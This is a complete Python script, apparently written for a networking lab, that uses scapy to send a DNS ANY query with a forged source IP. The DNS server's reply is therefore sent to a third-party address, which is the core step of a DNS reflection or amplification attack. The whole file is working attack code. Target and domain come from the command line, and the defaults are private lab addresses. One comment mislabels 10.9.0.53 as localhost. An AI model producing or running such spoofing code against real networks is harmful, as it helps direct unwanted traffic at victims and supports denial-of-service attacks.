#!/usr/bin/env python3
from scapy.all import *
import sys

def send_spoofed_dns_query(source_ip="10.9.0.5", target_dns="127.0.0.1", domain="example.com"):
    """
    Send a spoofed DNS ANY query with a forged source IP address.
    
    Parameters:
    source_ip (str): The spoofed source IP address
    target_dns (str): The DNS server to query
    domain (str): The domain to query information for
    """
    # Create the IP layer with the spoofed source IP
    ip = IP(src=source_ip, dst=target_dns)
    
    # Create the UDP layer for DNS (port 53)
    udp = UDP(sport=RandShort(), dport=53)
    
    # Create the DNS query layer requesting ANY records
    dns = DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))
    
    # Combine the layers
    packet = ip/udp/dns
    
    print(f"[*] Sending spoofed DNS ANY query to {target_dns}")
    print(f"[*] Spoofed source IP: {source_ip}")
    print(f"[*] Query domain: {domain}")
    
    # Send the packet and don't wait for a response (since it will go to the spoofed IP)
    send(packet, verbose=1)
    print(f"[*] Query sent. DNS response will be sent to {source_ip}, not to this machine.")

if __name__ == "__main__":
    # Default parameters
    SOURCE_IP = "10.9.0.5"
    
    # Get DNS server from command line or use default
    if len(sys.argv) > 1:
        TARGET_DNS = sys.argv[1]
    else:
        TARGET_DNS = "10.9.0.53"  # Default to localhost
    
    # Get domain from command line or use default
    if len(sys.argv) > 2:
        DOMAIN = sys.argv[2]
    else:
        DOMAIN = "example.com"
    
    send_spoofed_dns_query(SOURCE_IP, TARGET_DNS, DOMAIN)
